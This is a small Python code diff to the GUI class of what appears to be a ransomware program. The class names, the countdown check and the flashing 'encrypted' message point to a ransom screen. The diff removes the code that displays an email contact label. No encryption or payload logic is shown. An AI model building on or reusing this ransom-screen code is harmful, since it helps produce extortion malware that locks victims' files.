@@ -360,7 +360,6 @@ class Gui(MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.Ba
             self.set_message_to_null = False
         # Set message to text
         elif time_remaining:
-            self.EmailText.SetLabelText(self.GUI_LABEL_EMAIL[self.LANG])
             self.FlashingMessageText.SetLabelText(self.GUI_LABEL_TEXT_FLASHING_ENCRYPTED[self.LANG])
             self.HeaderPanel.Layout()  # Recenters the child widgets after text update (this works!)
             self.set_message_to_null = True
@@ -448,10 +447,6 @@ class Gui(MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.Ba
         )
                       )
         self.TitleLabel.SetLabel(self.__config["gui_title"])
-
-        # Set email text
-        self.EmailText.SetLabel(self.GUI_LABEL_EMAIL[self.LANG])
-        self.__set_as_primary_colour(self.EmailText)
 
         # Set flashing text initial label and Colour
         self.FlashingMessageText.SetLabel(self.GUI_LABEL_TEXT_FLASHING_ENCRYPTED[self.LANG])
